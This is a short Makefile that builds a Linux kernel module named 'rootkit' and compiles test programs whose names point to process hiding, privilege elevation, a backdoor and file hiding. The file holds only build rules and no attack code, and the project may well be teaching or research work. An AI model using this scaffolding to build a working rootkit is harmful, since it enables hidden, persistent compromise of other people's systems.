obj-m += rootkit.o

all:
	gcc -Wall -Werror test_hide_proc.c -o test_hide_proc
	gcc -Wall -Werror test_hide_child.c -o test_hide_child
	gcc -Wall -Werror test_elevate.c -o test_elevate
	gcc -Wall -Werror test_backdoor.c -o test_backdoor
	gcc -Wall -Werror test_hide_show_files.c -o test_show_hide
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	rm -rf test_hide_proc
	rm -rf test_elevate
	rm -rf test_hide_child
	rm -rf test_backdoor
	rm -rf test_show_hide
